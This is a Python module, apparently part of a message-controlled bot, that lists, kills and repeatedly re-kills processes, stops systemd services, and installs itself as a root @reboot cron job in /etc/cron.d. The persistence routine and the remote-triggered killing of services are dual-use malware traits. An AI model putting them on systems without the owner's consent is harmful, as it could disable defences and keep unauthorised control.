import os
import subprocess
import time
import threading

def kill_process_cmd(message):
    try:
        pid = message.split(" ")[1]
        return kill_process(pid)
    except Exception as e: return f"Error in kill_process_cmd(): {e}"
    
def kill_process(pid):
    try:
        pid = str(pid)
        subprocess.run(['kill', '-9', pid], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return f"Successfully killed process: {pid}"
    except subprocess.CalledProcessError as e: return f"Called Process Error in kill_process(): {e}"
    except Exception as e: return f"Error in kill_process(): {e}"
    
def get_all_pids_by_name(name):
    try:
        pids = []
        name = name.lower()
        ps_output = subprocess.check_output(['ps', '-e', '-o', 'pid,cmd'], universal_newlines=True)

        for line in ps_output.split('\n'):
            fields = line.strip().split(maxsplit=1)
            if len(fields) == 2 and name in fields[1].lower():
                pids.append(int(fields[0]))

        return pids
    except Exception: return None
    
def kill_all_processes_by_name(message):
    try:
        name = message.split(" ")[1]
        pids = get_all_pids_by_name(name)
        for pid in pids: kill_process(pid)
    except Exception as e: return f"Error in kill by name: {e}"

def repeat_kill_by_name_thread(name, quantity, time_rep):
    for _ in range(quantity):
        try:
            kill_all_processes_by_name(f"_ {name}")
            time.sleep(time_rep)
        except: pass

def repeat_kill_by_name(message):
    try:
        args = message.split(" ")
        name = args[1]
        quantity = int(args[2])
        if len(args) == 4: time_rep = int(args[3])
        else: time_rep = 7

        t = threading.Thread(target=repeat_kill_by_name_thread, args=[name, quantity, time_rep])
        t.start()
        return f"Started repeat_kill thread"
    except Exception as e: return f"Error in repeat_kill_by_name(): {e}"

def processes(message):
    try:
        split = message.split(" ")
        params = len(split) == 2
        finalstr = ""

        ps_output = subprocess.check_output(['ps', '-e', '-o', 'pid,cmd'], universal_newlines=True)

        for line in ps_output.split('\n'):
            fields = line.strip().split(maxsplit=1)
            if len(fields) == 2 and (not params or (params and split[1].lower() in fields[1].lower())):
                finalstr += f"PID: {fields[0]}, Name: {fields[1]}\n"
    except Exception as e: return f"Error in processes(): {e}"
    return finalstr

def get_all_services():
    try:
        systemctl_output = subprocess.check_output(['systemctl', 'list-units', '--type', 'service', '--all'], universal_newlines=True)
        services = [line.split()[0] for line in systemctl_output.split('\n')[1:] if line.strip()]
        return services
    except: return None

def stop_service(service_name):
    try:
        subprocess.run(['systemctl', 'stop', service_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return f"Successfully stopped service: {service_name}"
    except subprocess.CalledProcessError as e: return f"Called Process Error in stop_service(): {e}"
    except Exception as e: return f"Error in stop_service(): {e}"

def get_service_status(service_name):
    try:
        systemctl_status_output = subprocess.check_output(['systemctl', 'status', service_name], universal_newlines=True)
        status_lines = [line.strip() for line in systemctl_status_output.split('\n')]
        for line in status_lines:
            if line.startswith("Active:"):
                status = line.split()[1]
                return str(status)
    except subprocess.CalledProcessError as e: return f"Called Process Error in get_service_status(): {e}"
    except Exception as e: return f"Error in get_service_status(): {e}"
    
def stop_service_cmd(message):
    try:
        service_name = message.split(" ")[1]
        return stop_service(service_name)
    except Exception as e: return f"Error in stop_service_cmd(): {e}"

def get_all_services_cmd(message):
    try:
        running = False
        if len(message.split(" ")) > 1:
            running = True

        services = get_all_services()
        final = ""
        for service in services:
            service = service.encode('utf-8').decode('utf-8')
            print(service)
            service_status = get_service_status(service)
            service_status = service_status.encode("utf-8").decode("utf-8")
            
            if (running and service_status == "running") or not running:
                final += f"Name: {str(service)}, Status: {str(service_status)}\n"
        return final
    except Exception as e:
        return f"Error in get_all_services_cmd(): {e}"

def add_to_startup_1():
    try:
        script_path = os.path.abspath(__file__)
        cron_file = '/etc/cron.d/startup_script'

        with open(cron_file, 'w') as f: f.write(f'@reboot root {script_path}\n')
        return "Added to startup cron Success"
    except Exception as e: return f"Error in add_to_startup_1(): {e}"